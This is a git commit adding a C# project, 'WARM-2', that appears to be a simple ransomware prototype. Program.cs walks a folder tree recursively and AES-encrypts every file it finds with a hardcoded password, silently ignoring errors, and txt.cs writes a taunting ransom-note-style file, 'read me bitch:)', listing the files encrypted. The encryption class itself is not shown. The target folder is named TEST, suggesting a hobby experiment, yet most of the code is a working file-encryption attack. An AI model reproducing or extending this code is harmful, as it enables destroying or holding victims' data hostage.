13f695abbaade43debca7257a0cc329bb19c7c71
ma.orojloo <ma.orojloo@gmail.com>
2020-08-31 17:29:04 +0430

    adding progect to github (first diploy)

---
+++ WARM-2/Program.cs
@@ -0,0 +1,88 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+
+namespace WARM_2
+{
+    class Program
+    {
+        public static string msg;
+        static void Main()
+        {
+            
+           
+            msg = string.Empty;
+            foreach (string file in GetFiles(@"D:\TEST"))
+            {
+                Console.WriteLine(file);
+               msg= "=>" + msg + file + " has cryptoed"+"/n";
+
+                try
+                {
+                   
+                    var filePath = file;
+                    var password ="ma.orojloo";
+                    // برای آن که برنامه در هنگام عملیات رمزگذاری قفل نشود
+                    //  متد زیر را با استفاده از Task فراخوانی می کنیم
+                  AesCryptography.EncryptFile(filePath, password);
+                    Console.WriteLine("done");
+                }
+                catch (Exception ex)
+                {
+                    
+                }
+
+
+            }
+        }
+
+
+
+
+
+        static IEnumerable<string> GetFiles(string path)
+        {
+            Queue<string> queue = new Queue<string>();
+            queue.Enqueue(path);
+            while (queue.Count > 0)
+            {
+                path = queue.Dequeue();
+                try
+                {
+                    foreach (string subDir in Directory.GetDirectories(path))
+                    {
+                        queue.Enqueue(subDir);
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Console.Error.WriteLine(ex);
+                }
+                string[] files = null;
+                try
+                {
+                    files = Directory.GetFiles(path);
+                }
+                catch (Exception ex)
+                {
+                    Console.Error.WriteLine(ex);
+                }
+                if (files != null)
+                {
+                    for (int i = 0; i < files.Length; i++)
+                    {
+                        yield return files[i];
+                    }
+                }
+            }
+        }
+    }
+}
---
+++ WARM-2/txt.cs
@@ -0,0 +1,33 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.IO;
+
+
+namespace WARM_2
+{
+    class txt
+    {
+
+        public static void BinaryWriter ()
+        {
+            var startupPath = System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location);
+            var date= DateTime.Now.ToString("HH:mm:ss tt");//zaman ro mide
+            FileStream fs = new FileStream(startupPath+"read me bitch:)"+" ("+ date+")", FileMode.Create);
+
+            StreamWriter writer = new StreamWriter(fs);
+
+            writer.Write(Program.msg);
+            writer.Close();
+
+
+        }
+
+
+    }
+}
